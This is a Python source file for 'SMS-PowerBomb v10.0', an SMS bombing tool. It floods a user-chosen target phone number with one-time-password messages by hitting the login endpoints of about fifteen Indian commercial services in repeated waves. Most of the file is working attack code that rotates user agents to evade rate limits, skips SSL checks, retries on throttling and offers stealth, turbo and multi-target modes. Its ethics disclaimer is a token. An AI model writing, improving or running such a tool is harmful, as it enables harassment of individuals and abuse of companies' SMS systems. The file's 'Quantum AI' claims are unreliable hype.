#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v10.0 - ULTIMATE FINAL EDITION ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# GitHub: https://github.com/RAJSARASWATI-JATAV
# Telegram: https://t.me/rajsaraswatijatav
# Instagram: @official_rajsaraswati_jatav
# YouTube: @RajsaraswatiJatav
# ═══════════════════════════════════════════════════════════════════
# [ULTIMATE] Next-Level SMS Automation with Quantum AI & Rich UI
# [POWER] 10x Faster | Quantum AI | Beautiful UI | Multi-Target
# [FINAL] The Most Advanced CLI Tool Ever Created
# ═══════════════════════════════════════════════════════════════════
# Stay dark, stay ethical. Upgrade yourself!
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import time
import asyncio
import aiohttp
from typing import List, Dict, Tuple, Optional
import json
import random
from datetime import datetime

# Import Rich UI
try:
    from ui_manager import ui, RichUI
    RICH_UI_ENABLED = True
except ImportError:
    RICH_UI_ENABLED = False
    print("⚠️ Rich UI not available. Install: pip install rich")

# Import AI modules
try:
    from quantum_ai import QuantumAIEngine, MultiTargetManager
    from ai_engine import AIEngine, SmartAPISelector
    QUANTUM_AI_ENABLED = True
except ImportError:
    QUANTUM_AI_ENABLED = False
    print("⚠️ Quantum AI modules not found.")

# Import enhanced features
try:
    from enhanced_features import (
        FavoritesManager, NetworkChecker, QuickModeConfig,
        ConfigManager, ErrorHelper
    )
    ENHANCED_FEATURES = True
except ImportError:
    ENHANCED_FEATURES = False
    print("⚠️ Enhanced features not available.")

# Import analytics
try:
    from analytics import AnalyticsEngine
    ANALYTICS_ENABLED = True
except ImportError:
    ANALYTICS_ENABLED = False
    print("⚠️ Analytics module not found.")

# ═══════════════════════════════════════════════════════════════════
# ADVANCED BOMBER ENGINE WITH QUANTUM AI
# ═══════════════════════════════════════════════════════════════════

class UltimateBomberEngine:
    """Ultimate bomber engine with Quantum AI integration"""
    
    def __init__(self, apis: List[Dict]):
        self.apis = apis
        self.api_health = {api['name']: {'success': 0, 'fail': 0, 'active': True} for api in apis}
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.start_time = None
        
        # Initialize Quantum AI
        self.quantum_ai = QuantumAIEngine() if QUANTUM_AI_ENABLED else None
        self.analytics = AnalyticsEngine() if ANALYTICS_ENABLED else None
        self.session_id = None
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
    
    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)
    
    def get_active_apis(self) -> List[Dict]:
        """Get only active APIs"""
        return [api for api in self.apis if self.api_health[api['name']]['active']]
    
    def update_api_health(self, api_name: str, success: bool):
        """Update API health status"""
        if success:
            self.api_health[api_name]['success'] += 1
        else:
            self.api_health[api_name]['fail'] += 1
        
        # Disable API if fail rate > 90%
        total = self.api_health[api_name]['success'] + self.api_health[api_name]['fail']
        if total >= 5:
            fail_rate = self.api_health[api_name]['fail'] / total
            if fail_rate > 0.9:
                self.api_health[api_name]['active'] = False
    
    async def send_sms_with_retry(self, session: aiohttp.ClientSession, api: Dict, 
                                  phone: str, max_retries: int = 3) -> Tuple[str, bool, str]:
        """Send SMS with retry logic"""
        for attempt in range(max_retries):
            try:
                headers = api["headers"].copy()
                headers["User-Agent"] = self.get_random_user_agent()
                
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
                start_time = time.time()
                
                if api["method"] == "POST":
                    async with session.post(
                        api["url"],
                        json=api["data"](phone),
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False
                    ) as response:
                        response_time = time.time() - start_time
                        
                        if response.status in [200, 201, 202]:
                            self.update_api_health(api['name'], True)
                            
                            # Record in Quantum AI
                            if self.quantum_ai:
                                carrier = self._detect_carrier(phone)
                                self.quantum_ai.record_quantum_result(
                                    api['name'], True, response_time, carrier
                                )
                            
                            return (api["name"], True, "Success")
                        elif response.status == 429:
                            if attempt < max_retries - 1:
                                await asyncio.sleep(2 ** attempt)
                                continue
                        
                        self.update_api_health(api['name'], False)
                        if self.quantum_ai:
                            self.quantum_ai.record_quantum_result(
                                api['name'], False, response_time
                            )
                        return (api["name"], False, f"Status: {response.status}")
            
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                self.update_api_health(api['name'], False)
                return (api["name"], False, "Timeout")
            
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                self.update_api_health(api['name'], False)
                return (api["name"], False, "Failed")
        
        return (api["name"], False, "Max retries exceeded")
    
    def _detect_carrier(self, phone: str) -> str:
        """Detect carrier from phone number"""
        carrier_map = {
            '6': 'Vodafone/Vi',
            '7': 'Airtel/Jio',
            '8': 'Airtel/BSNL',
            '9': 'Jio/Airtel'
        }
        if phone and len(phone) >= 1:
            return carrier_map.get(phone[0], 'Unknown')
        return 'Unknown'
    
    def get_stats(self) -> Dict:
        """Get comprehensive statistics"""
        success_rate = (self.success_count / self.total_attempts * 100) if self.total_attempts > 0 else 0
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        
        return {
            "total_attempts": self.total_attempts,
            "success": self.success_count,
            "failed": self.fail_count,
            "success_rate": success_rate,
            "elapsed_time": elapsed_time,
            "active_apis": sum(1 for h in self.api_health.values() if h['active'])
        }

# ═══════════════════════════════════════════════════════════════════
# SMS API CONFIGURATIONS
# ═══════════════════════════════════════════════════════════════════

SMS_APIS = [
    {
        "name": "OLA",
        "url": "https://api.olacabs.com/v1/auth/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_code": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/sendOTP",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone, "purpose": "REGISTRATION"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Paytm",
        "url": "https://accounts.paytm.com/v2/login/generateOtp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Flipkart",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "data": lambda phone: {"loginId": phone},
        "headers": {"Content-Type": "application/json", "X-User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Zomato",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_id": "1"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PhonePe",
        "url": "https://api.phonepe.com/apis/hermes/login",
        "method": "POST",
        "data": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MakeMyTrip",
        "url": "https://www.makemytrip.com/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/checkout/api/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/auth/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Uber",
        "url": "https://auth.uber.com/v2/otp/send",
        "method": "POST",
        "data": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Rapido",
        "url": "https://api.rapido.bike/api/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Meesho",
        "url": "https://www.meesho.com/api/v1/otp/send",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Ajio",
        "url": "https://www.ajio.com/api/auth/otp",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    }
]

# ═══════════════════════════════════════════════════════════════════
# BOMBING MODES
# ═══════════════════════════════════════════════════════════════════

async def quantum_smart_bombing(engine: UltimateBomberEngine, phone: str, count: int):
    """Quantum AI-powered smart bombing"""
    if not RICH_UI_ENABLED:
        ui.print_error("Rich UI not available!")
        return
    
    ui.print_info("🧠 Quantum AI Smart Mode Activated")
    ui.print_info("AI is analyzing patterns and selecting optimal APIs...")
    time.sleep(1)
    
    engine.start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            ui.console.print(f"\n[bold magenta]{'═' * 75}[/bold magenta]")
            ui.console.print(f"[bold cyan]Wave {wave + 1}/{count}[/bold cyan] - {datetime.now().strftime('%H:%M:%S')}")
            ui.console.print(f"[bold magenta]{'═' * 75}[/bold magenta]\n")
            
            # Get optimal APIs from Quantum AI
            if engine.quantum_ai:
                carrier = engine._detect_carrier(phone)
                optimal_apis = engine.quantum_ai.get_quantum_apis(
                    engine.get_active_apis(), 
                    carrier=carrier
                )
            else:
                optimal_apis = engine.get_active_apis()
            
            # Send SMS
            tasks = [engine.send_sms_with_retry(session, api, phone) for api in optimal_apis]
            results = await asyncio.gather(*tasks)
            
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                engine.total_attempts += 1
                if success:
                    engine.success_count += 1
                    wave_success += 1
                    ui.console.print(f"  [green]✓[/green] {name:<15} [green][SENT][/green]")
                else:
                    engine.fail_count += 1
                    wave_fail += 1
                    ui.console.print(f"  [red]✗[/red] {name:<15} [red][FAILED][/red] [dim]{message}[/dim]")
            
            stats = engine.get_stats()
            ui.console.print(f"\n[cyan]Wave Stats:[/cyan] [green]{wave_success} Success[/green] | [red]{wave_fail} Failed[/red] | [yellow]Active APIs: {stats['active_apis']}[/yellow]\n")
            
            if wave < count - 1:
                # Quantum AI calculates optimal delay
                if engine.quantum_ai:
                    delay = engine.quantum_ai.calculate_quantum_delay(stats['success_rate'], 'smart')
                else:
                    delay = 2.0
                
                ui.console.print(f"[dim]Quantum delay: {delay:.1f}s...[/dim]")
                await asyncio.sleep(delay)
    
    # Save quantum memory
    if engine.quantum_ai:
        engine.quantum_ai.save_quantum_memory()
    
    ui.print_session_summary(phone, engine.get_stats())

async def normal_mode_bombing(engine: UltimateBomberEngine, phone: str, count: int, delay: int = 2):
    """Normal mode bombing"""
    if not RICH_UI_ENABLED:
        print("Rich UI not available!")
        return
    
    ui.console.print("\n[bold blue]╔═══════════════════════════════════════════════════════════════════════════╗[/bold blue]")
    ui.console.print("[bold blue]║[/bold blue][bold white]                    INITIATING BOMBING SEQUENCE                           [/bold white][bold blue]║[/bold blue]")
    ui.console.print("[bold blue]╚═══════════════════════════════════════════════════════════════════════════╝[/bold blue]\n")
    
    ui.console.print(f"[green]>>[/green] Target Number: [yellow]{phone}[/yellow]")
    ui.console.print(f"[green]>>[/green] Total Waves: [yellow]{count}[/yellow]")
    ui.console.print(f"[green]>>[/green] APIs Active: [yellow]{len(engine.get_active_apis())}[/yellow]")
    ui.console.print(f"[green]>>[/green] Delay Between Waves: [yellow]{delay}s[/yellow]\n")
    
    time.sleep(1)
    engine.start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            ui.console.print(f"\n[bold magenta]{'═' * 75}[/bold magenta]")
            ui.console.print(f"[bold cyan]Wave {wave + 1}/{count}[/bold cyan] - {datetime.now().strftime('%H:%M:%S')}")
            ui.console.print(f"[bold magenta]{'═' * 75}[/bold magenta]\n")
            
            active_apis = engine.get_active_apis()
            tasks = [engine.send_sms_with_retry(session, api, phone) for api in active_apis]
            results = await asyncio.gather(*tasks)
            
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                engine.total_attempts += 1
                if success:
                    engine.success_count += 1
                    wave_success += 1
                    ui.console.print(f"  [green]✓[/green] {name:<15} [green][SENT][/green]")
                else:
                    engine.fail_count += 1
                    wave_fail += 1
                    ui.console.print(f"  [red]✗[/red] {name:<15} [red][FAILED][/red] [dim]{message}[/dim]")
            
            stats = engine.get_stats()
            ui.console.print(f"\n[cyan]Wave Summary:[/cyan] [green]{wave_success} Success[/green] | [red]{wave_fail} Failed[/red] | [yellow]Active APIs: {stats['active_apis']}[/yellow]\n")
            
            if wave < count - 1:
                ui.console.print(f"[dim]Waiting {delay}s before next wave...[/dim]")
                await asyncio.sleep(delay)
    
    ui.print_session_summary(phone, engine.get_stats())

# ═══════════════════════════════════════════════════════════════════
# INPUT VALIDATION
# ═══════════════════════════════════════════════════════════════════

def validate_phone(phone: str) -> bool:
    """Validate Indian phone number"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    
    if len(phone) == 10 and phone.isdigit() and phone[0] in ['6', '7', '8', '9']:
        return True
    
    if len(phone) == 12 and phone.startswith("91") and phone[2] in ['6', '7', '8', '9']:
        return True
    
    return False

def normalize_phone(phone: str) -> str:
    """Normalize phone number to 10 digits"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if len(phone) == 12 and phone.startswith("91"):
        return phone[2:]
    return phone

# ═══════════════════════════════════════════════════════════════════
# MAIN MENU SYSTEM
# ═══════════════════════════════════════════════════════════════════

def main_menu():
    """Main menu loop"""
    engine = UltimateBomberEngine(SMS_APIS)
    favorites_mgr = FavoritesManager() if ENHANCED_FEATURES else None
    multi_target_mgr = MultiTargetManager() if QUANTUM_AI_ENABLED else None
    
    while True:
        ui.clear()
        ui.print_banner()
        ui.print_loading_animation()
        ui.print_creator_info()
        
        # Create main menu
        menu_options = [
            ("1", "🚀 Start SMS Bombing (Quantum AI Modes)"),
            ("2", "⭐ Favorites Manager"),
            ("3", "🎯 Multi-Target Batch Bombing"),
            ("4", "📊 View Analytics & History"),
            ("5", "🔍 Check API Status & Health"),
            ("6", "🧠 Quantum AI Dashboard"),
            ("7", "⚙️  Settings & Configuration"),
            ("8", "ℹ️  About Tool & Creator"),
            ("9", "⚠️  View Disclaimer"),
            ("0", "🚪 Exit")
        ]
        
        menu = ui.create_menu("🎮 MAIN MENU", menu_options, show_ai_status=QUANTUM_AI_ENABLED)
        ui.console.print(menu)
        
        choice = ui.get_input("Select an option")
        
        if choice == "1":
            # Start SMS Bombing
            start_bombing_menu(engine)
        
        elif choice == "2":
            # Favorites Manager
            if favorites_mgr:
                favorites_menu(favorites_mgr, engine)
            else:
                ui.print_error("Favorites feature not available!")
                time.sleep(2)
        
        elif choice == "3":
            # Multi-Target Bombing
            if multi_target_mgr:
                multi_target_menu(multi_target_mgr, engine)
            else:
                ui.print_error("Multi-target feature not available!")
                time.sleep(2)
        
        elif choice == "4":
            # Analytics
            if ANALYTICS_ENABLED:
                analytics_menu(engine)
            else:
                ui.print_error("Analytics not available!")
                time.sleep(2)
        
        elif choice == "5":
            # API Status
            api_status_menu(engine)
        
        elif choice == "6":
            # Quantum AI Dashboard
            if QUANTUM_AI_ENABLED and engine.quantum_ai:
                quantum_ai_dashboard(engine.quantum_ai)
            else:
                ui.print_error("Quantum AI not available!")
                time.sleep(2)
        
        elif choice == "7":
            # Settings
            settings_menu()
        
        elif choice == "8":
            # About
            ui.clear()
            ui.print_banner()
            ui.print_creator_info()
            ui.get_input("\nPress Enter to continue")
        
        elif choice == "9":
            # Disclaimer
            ui.clear()
            ui.print_banner()
            ui.print_disclaimer()
            ui.get_input("\nPress Enter to continue")
        
        elif choice == "0":
            # Exit
            ui.clear()
            ui.console.print("\n[bold magenta]╔═══════════════════════════════════════════════════════════════════════════╗[/bold magenta]")
            ui.console.print("[bold magenta]║[/bold magenta][bold white]                         EXITING SMS-POWERBOMB                             [/bold white][bold magenta]║[/bold magenta]")
            ui.console.print("[bold magenta]╚═══════════════════════════════════════════════════════════════════════════╝[/bold magenta]\n")
            ui.print_success("Thank you for using SMS-PowerBomb v10.0")
            ui.console.print("[magenta]Created by:[/magenta] [cyan]RAJSARASWATI JATAV[/cyan]")
            ui.console.print("[yellow]Stay dark, stay ethical. Upgrade yourself![/yellow]\n")
            time.sleep(2)
            sys.exit(0)
        
        else:
            ui.print_error("Invalid option! Please try again.")
            time.sleep(2)

def start_bombing_menu(engine: UltimateBomberEngine):
    """Start bombing menu"""
    ui.clear()
    ui.print_banner()
    ui.print_disclaimer()
    
    if not ui.get_confirmation("Do you accept the terms and conditions?"):
        ui.print_warning("You must accept the terms to use this tool.")
        time.sleep(2)
        return
    
    # Get phone number
    while True:
        phone = ui.get_input("Enter target phone number (10 digits)")
        if validate_phone(phone):
            phone = normalize_phone(phone)
            ui.print_success(f"Valid phone number: {phone}")
            break
        else:
            ui.print_error("Invalid phone number! Must be 10 digits starting with 6/7/8/9.")
    
    # Get wave count
    while True:
        try:
            count = int(ui.get_input("Enter number of SMS waves (1-100)", "10"))
            if 1 <= count <= 100:
                ui.print_success(f"Wave count set to: {count}")
                break
            else:
                ui.print_error("Please enter a number between 1 and 100.")
        except ValueError:
            ui.print_error("Invalid input! Please enter a number.")
    
    # Select mode
    mode_options = [
        ("1", "Normal Mode (Balanced)"),
        ("2", "Stealth Mode (Randomized, slower)"),
        ("3", "Turbo Mode (Maximum speed)"),
    ]
    
    if QUANTUM_AI_ENABLED:
        mode_options.append(("4", "🧠 Quantum Smart Mode (AI-optimized)"))
    
    mode_menu = ui.create_menu("🎮 SELECT BOMBING MODE", mode_options)
    ui.console.print(mode_menu)
    
    mode = ui.get_input("Choose mode (1-4)" if QUANTUM_AI_ENABLED else "Choose mode (1-3)")
    
    delay = 2
    if mode == '1':
        while True:
            try:
                delay = int(ui.get_input("Delay between waves in seconds (1-10)", "2"))
                if 1 <= delay <= 10:
                    break
                else:
                    ui.print_error("Please enter a number between 1 and 10.")
            except ValueError:
                ui.print_error("Invalid input! Please enter a number.")
    
    # Confirm
    if not ui.get_confirmation(f"Are you sure you want to bomb {phone}?"):
        ui.print_warning("Operation cancelled.")
        time.sleep(2)
        return
    
    ui.print_success("Starting bombing sequence...")
    time.sleep(1)
    
    try:
        if mode == '4' and QUANTUM_AI_ENABLED:
            asyncio.run(quantum_smart_bombing(engine, phone, count))
        else:
            asyncio.run(normal_mode_bombing(engine, phone, count, delay))
    except KeyboardInterrupt:
        ui.print_warning("\nBombing interrupted by user.")
    
    ui.get_input("\nPress Enter to return to main menu")

def favorites_menu(favorites_mgr: 'FavoritesManager', engine: UltimateBomberEngine):
    """Favorites management menu"""
    while True:
        ui.clear()
        ui.print_banner()
        
        favorites = favorites_mgr.get_all()
        
        if favorites:
            table = ui.print_favorites_table(favorites)
            ui.console.print(table)
        else:
            ui.print_info("No favorites saved yet.")
        
        ui.console.print()
        
        menu_options = [
            ("1", "Add New Favorite"),
            ("2", "Remove Favorite"),
            ("3", "Bomb Favorite"),
            ("0", "Back to Main Menu")
        ]
        
        menu = ui.create_menu("⭐ FAVORITES MANAGER", menu_options)
        ui.console.print(menu)
        
        choice = ui.get_input("Select an option")
        
        if choice == "1":
            phone = ui.get_input("Enter phone number")
            if validate_phone(phone):
                phone = normalize_phone(phone)
                name = ui.get_input("Enter name (optional)", "")
                favorites_mgr.add_favorite(phone, name)
                ui.print_success(f"Added {phone} to favorites!")
            else:
                ui.print_error("Invalid phone number!")
            time.sleep(2)
        
        elif choice == "2":
            if favorites:
                try:
                    idx = int(ui.get_input("Enter favorite number to remove")) - 1
                    if favorites_mgr.remove_favorite(idx):
                        ui.print_success("Favorite removed!")
                    else:
                        ui.print_error("Invalid favorite number!")
                except ValueError:
                    ui.print_error("Invalid input!")
            else:
                ui.print_info("No favorites to remove!")
            time.sleep(2)
        
        elif choice == "3":
            if favorites:
                try:
                    idx = int(ui.get_input("Enter favorite number to bomb")) - 1
                    fav = favorites_mgr.get_favorite(idx)
                    if fav:
                        favorites_mgr.increment_usage(idx)
                        # Start bombing with this number
                        ui.print_info(f"Selected: {fav['name']} - {fav['phone']}")
                        time.sleep(1)
                        # TODO: Implement bombing logic
                    else:
                        ui.print_error("Invalid favorite number!")
                except ValueError:
                    ui.print_error("Invalid input!")
            else:
                ui.print_info("No favorites available!")
            time.sleep(2)
        
        elif choice == "0":
            break
        
        else:
            ui.print_error("Invalid option!")
            time.sleep(2)

def multi_target_menu(multi_target_mgr: 'MultiTargetManager', engine: UltimateBomberEngine):
    """Multi-target bombing menu"""
    ui.clear()
    ui.print_banner()
    ui.print_info("🎯 Multi-Target Batch Bombing")
    ui.print_warning("This feature allows bombing multiple numbers in sequence.")
    ui.get_input("\nPress Enter to continue")

def analytics_menu(engine: UltimateBomberEngine):
    """Analytics menu"""
    ui.clear()
    ui.print_banner()
    
    if not ANALYTICS_ENABLED:
        ui.print_error("Analytics not available!")
        ui.get_input("\nPress Enter to continue")
        return
    
    analytics = AnalyticsEngine()
    trends = analytics.get_performance_trends(days=7)
    
    ui.console.print("[bold cyan]📊 ANALYTICS DASHBOARD[/bold cyan]\n")
    ui.print_analytics_summary(trends)
    
    # Show recent sessions
    sessions = analytics.get_session_history(limit=10)
    if sessions:
        ui.console.print("[bold yellow]Recent Sessions:[/bold yellow]\n")
        # TODO: Display sessions table
    
    ui.get_input("\nPress Enter to continue")

def api_status_menu(engine: UltimateBomberEngine):
    """API status menu"""
    ui.clear()
    ui.print_banner()
    
    ui.console.print("[bold cyan]🔍 API STATUS & HEALTH CHECK[/bold cyan]\n")
    
    active_count = sum(1 for h in engine.api_health.values() if h['active'])
    ui.console.print(f"[white]Total APIs:[/white] [yellow]{len(SMS_APIS)}[/yellow]")
    ui.console.print(f"[white]Active APIs:[/white] [green]{active_count}[/green]")
    ui.console.print(f"[white]Inactive APIs:[/white] [red]{len(SMS_APIS) - active_count}[/red]\n")
    
    table = ui.create_api_status_table(engine.api_health)
    ui.console.print(table)
    
    ui.console.print()
    ui.print_success("API health monitoring active!")
    ui.print_warning("APIs with >90% fail rate are auto-disabled.")
    
    ui.get_input("\nPress Enter to continue")

def quantum_ai_dashboard(quantum_ai: 'QuantumAIEngine'):
    """Quantum AI dashboard"""
    ui.clear()
    ui.print_banner()
    
    ui.console.print("[bold cyan]🧠 QUANTUM AI DASHBOARD[/bold cyan]\n")
    
    insights = quantum_ai.get_quantum_insights()
    
    # Display insights
    stats_table = ui.create_stats_table({
        'Quantum Boost': f"{insights['quantum_boost']:.2f}x",
        'Evolution Gen': insights['evolution_generation'],
        'Total Sessions': insights['total_sessions'],
        'Learning Progress': f"{insights['learning_progress']:.1f}%",
        'Quantum State': insights['quantum_state'].upper()
    })
    
    ui.console.print(stats_table)
    ui.console.print()
    
    if insights['best_apis']:
        ui.console.print("[bold green]🏆 Top Performing APIs:[/bold green]")
        for i, api in enumerate(insights['best_apis'], 1):
            ui.console.print(f"  {i}. [cyan]{api}[/cyan]")
        ui.console.print()
    
    if insights['recommendations']:
        ui.console.print("[bold yellow]💡 AI Recommendations:[/bold yellow]")
        for rec in insights['recommendations']:
            ui.console.print(f"  • {rec}")
        ui.console.print()
    
    ui.get_input("\nPress Enter to continue")

def settings_menu():
    """Settings menu"""
    ui.clear()
    ui.print_banner()
    ui.console.print("[bold cyan]⚙️  SETTINGS & CONFIGURATION[/bold cyan]\n")
    ui.print_info("Settings feature coming soon!")
    ui.get_input("\nPress Enter to continue")

# ═══════════════════════════════════════════════════════════════════
# PROGRAM ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        if not RICH_UI_ENABLED:
            print("ERROR: Rich UI library not installed!")
            print("Install with: pip install rich")
            sys.exit(1)
        
        main_menu()
    except KeyboardInterrupt:
        ui.console.print("\n\n[red]Interrupted by user (Ctrl+C).[/red]")
        ui.console.print("[green]Stay dark, stay ethical. Upgrade yourself![/green]\n")
        sys.exit(0)
    except Exception as e:
        ui.console.print(f"\n[red][ERROR] {str(e)}[/red]\n")
        sys.exit(1)